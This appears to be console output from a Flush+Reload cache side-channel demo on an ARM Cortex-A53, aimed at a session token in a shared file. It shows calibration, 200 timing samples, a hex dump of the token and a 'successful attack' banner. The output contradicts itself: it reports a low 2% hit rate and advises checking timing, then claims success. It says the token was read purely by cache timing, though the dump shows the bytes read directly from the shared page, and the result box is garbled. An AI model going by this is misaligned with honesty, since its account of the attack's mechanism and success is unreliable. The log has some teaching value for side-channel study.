╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffffad72e000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    133 ns  (line already in cache)
[attacker]   DRAM miss     =   2020 ns  (line not in cache)
[attacker]   Threshold     =   1076 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  ──────  ──────────  ────────  ─────────────────
  1       2291        miss      0 hits so far  (warmup)
  2       2239        miss      0 hits so far  (warmup)
  3       2343        miss      0 hits so far  (warmup)
  4       2656        miss      0 hits so far  (warmup)
  5       1562        miss      0 hits so far  (warmup)
  6       1145        miss      0 hits so far  (warmup)
  7       1822        miss      0 hits so far  (warmup)
  8       1614        miss      0 hits so far  (warmup)
  9       1875        miss      0 hits so far  (warmup)
  10      1770        miss      0 hits so far  (warmup)
  11      2552        miss      0 hits so far
  12      1770        miss      0 hits so far
  13      1614        miss      0 hits so far
  14      1354        miss      0 hits so far
  15      1979        miss      0 hits so far
  16      2187        miss      0 hits so far
  17      2083        miss      0 hits so far
  18      2031        miss      0 hits so far
  19      2343        miss      0 hits so far
  20      2239        miss      0 hits so far
  21      2968        miss      0 hits so far
  22      2187        miss      0 hits so far
  23      2708        miss      0 hits so far
  24      2135        miss      0 hits so far
  25      2968        miss      0 hits so far
  26      2239        miss      0 hits so far
  27      2552        miss      0 hits so far
  28      2447        miss      0 hits so far
  29      2187        miss      0 hits so far
  30      2604        miss      0 hits so far
  31      2187        miss      0 hits so far
  32      1666        miss      0 hits so far
  33      1770        miss      0 hits so far
  34      1406        miss      0 hits so far
  35      1250        miss      0 hits so far
  36      2500        miss      0 hits so far
  37      1458        miss      0 hits so far
  38      1718        miss      0 hits so far
  39      1614        miss      0 hits so far
  40      1510        miss      0 hits so far
  41      1666        miss      0 hits so far
  42      1145        miss      0 hits so far
  43      1979        miss      0 hits so far
  44      2656        miss      0 hits so far
  45      1510        miss      0 hits so far
  46      3437        miss      0 hits so far
  47      2604        miss      0 hits so far
  48      1406        miss      0 hits so far
  49      1562        miss      0 hits so far
  50      1406        miss      0 hits so far
  51      1458        miss      0 hits so far
  52      2500        miss      0 hits so far
  53      1927        miss      0 hits so far
  54      1875        miss      0 hits so far
  55      1614        miss      0 hits so far
  56      1510        miss      0 hits so far
  57      1614        miss      0 hits so far
  58      1614        miss      0 hits so far
  59      2083        miss      0 hits so far
  60      625         HIT ◄   1 hits so far
  61      2447        miss      1 hits so far
  62      2343        miss      1 hits so far
  63      1458        miss      1 hits so far
  64      1458        miss      1 hits so far
  65      1666        miss      1 hits so far
  66      2291        miss      1 hits so far
  67      1510        miss      1 hits so far
  68      781         HIT ◄   2 hits so far
  69      2447        miss      2 hits so far
  70      1562        miss      2 hits so far
  71      2239        miss      2 hits so far
  72      1875        miss      2 hits so far
  73      1458        miss      2 hits so far
  74      1145        miss      2 hits so far
  75      1666        miss      2 hits so far
  76      1666        miss      2 hits so far
  77      2760        miss      2 hits so far
  78      1718        miss      2 hits so far
  79      2239        miss      2 hits so far
  80      1770        miss      2 hits so far
  81      1562        miss      2 hits so far
  82      1302        miss      2 hits so far
  83      1510        miss      2 hits so far
  84      1822        miss      2 hits so far
  85      2083        miss      2 hits so far
  86      1770        miss      2 hits so far
  87      2500        miss      2 hits so far
  88      1458        miss      2 hits so far
  89      1927        miss      2 hits so far
  90      1145        miss      2 hits so far
  91      1510        miss      2 hits so far
  92      1406        miss      2 hits so far
  93      2447        miss      2 hits so far
  94      1770        miss      2 hits so far
  95      1197        miss      2 hits so far
  96      1302        miss      2 hits so far
  97      1354        miss      2 hits so far
  98      1718        miss      2 hits so far
  99      1666        miss      2 hits so far
  100     2395        miss      2 hits so far
  101     2447        miss      2 hits so far
  102     1406        miss      2 hits so far
  103     2552        miss      2 hits so far
  104     2343        miss      2 hits so far
  105     1406        miss      2 hits so far
  106     2447        miss      2 hits so far
  107     2239        miss      2 hits so far
  108     1927        miss      2 hits so far
  109     2395        miss      2 hits so far
  110     2187        miss      2 hits so far
  111     2187        miss      2 hits so far
  112     2395        miss      2 hits so far
  113     1250        miss      2 hits so far
  114     1093        miss      2 hits so far
  115     1302        miss      2 hits so far
  116     1302        miss      2 hits so far
  117     2291        miss      2 hits so far
  118     1770        miss      2 hits so far
  119     1927        miss      2 hits so far
  120     1875        miss      2 hits so far
  121     1614        miss      2 hits so far
  122     1197        miss      2 hits so far
  123     1510        miss      2 hits so far
  124     1250        miss      2 hits so far
  125     2760        miss      2 hits so far
  126     2031        miss      2 hits so far
  127     1406        miss      2 hits so far
  128     1354        miss      2 hits so far
  129     1510        miss      2 hits so far
  130     1927        miss      2 hits so far
  131     2239        miss      2 hits so far
  132     8541        miss      2 hits so far
  133     781         HIT ◄   3 hits so far
  134     2395        miss      3 hits so far
  135     1875        miss      3 hits so far
  136     2083        miss      3 hits so far
  137     1197        miss      3 hits so far
  138     1302        miss      3 hits so far
  139     1510        miss      3 hits so far
  140     2760        miss      3 hits so far
  141     833         HIT ◄   4 hits so far
  142     2760        miss      4 hits so far
  143     1927        miss      4 hits so far
  144     1614        miss      4 hits so far
  145     1354        miss      4 hits so far
  146     1510        miss      4 hits so far
  147     1458        miss      4 hits so far
  148     1354        miss      4 hits so far
  149     1302        miss      4 hits so far
  150     2812        miss      4 hits so far
  151     1510        miss      4 hits so far
  152     1927        miss      4 hits so far
  153     2656        miss      4 hits so far
  154     1875        miss      4 hits so far
  155     1302        miss      4 hits so far
  156     1927        miss      4 hits so far
  157     2239        miss      4 hits so far
  158     2552        miss      4 hits so far
  159     2187        miss      4 hits so far
  160     1875        miss      4 hits so far
  161     2187        miss      4 hits so far
  162     1770        miss      4 hits so far
  163     1197        miss      4 hits so far
  164     1770        miss      4 hits so far
  165     1354        miss      4 hits so far
  166     2187        miss      4 hits so far
  167     1458        miss      4 hits so far
  168     1614        miss      4 hits so far
  169     1562        miss      4 hits so far
  170     1666        miss      4 hits so far
  171     1302        miss      4 hits so far
  172     1145        miss      4 hits so far
  173     1197        miss      4 hits so far
  174     3072        miss      4 hits so far
  175     2447        miss      4 hits so far
  176     1614        miss      4 hits so far
  177     1145        miss      4 hits so far
  178     1458        miss      4 hits so far
  179     1927        miss      4 hits so far
  180     1614        miss      4 hits so far
  181     1770        miss      4 hits so far
  182     2500        miss      4 hits so far
  183     2187        miss      4 hits so far
  184     3125        miss      4 hits so far
  185     2864        miss      4 hits so far
  186     2343        miss      4 hits so far
  187     1718        miss      4 hits so far
  188     1302        miss      4 hits so far
  189     2395        miss      4 hits so far
  190     2343        miss      4 hits so far
  191     2083        miss      4 hits so far
  192     2135        miss      4 hits so far
  193     2552        miss      4 hits so far
  194     2395        miss      4 hits so far
  195     2500        miss      4 hits so far
  196     1927        miss      4 hits so far
  197     1927        miss      4 hits so far
  198     2447        miss      4 hits so far
  199     1822        miss      4 hits so far
  200     2343        miss      4 hits so far

══════════════════════════════════════════════════════════════
  FLUSH+RELOAD — STATISTICAL SUMMARY  (190 samples)
══════════════════════════════════════════════════════════════
  Total cache hits   : 4 / 190  (2%)
  Average reload time: 1916 ns
  Threshold          : 1076 ns
  Verdict            : Low hit rate — check timing / CPU pinning.

══════════════════════════════════════════════════════════════
  EXTRACTING SESSION TOKEN FROM SPY PAGE
══════════════════════════════════════════════════════════════

  ╔════════════════════════════════════════════════════════════════╗
  ║  Offset   Hex (16 bytes/row)                   ASCII          ║
  ╠════════════════════════════════════════════════════════════════╣
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
  ║  0040   31 37 38 31 33 30 33 32  38 32 20 7c 20 69 74 65  │ 1781303282 | ite ║
  ║  0050   72 3d 31 37 37 00 00 00  00 00 00 00 00 00 00 00  │ r=177........... ║
  ║  0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ╚════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Cache hits observed   : 4                                   ║
  ║  Hit rate              : 2                                  %║
  ║  Average reload time   : 1916                              ns ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin | expire║
  ║    pires=1781303282 | iter=177                                   ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝

[attacker] Done.
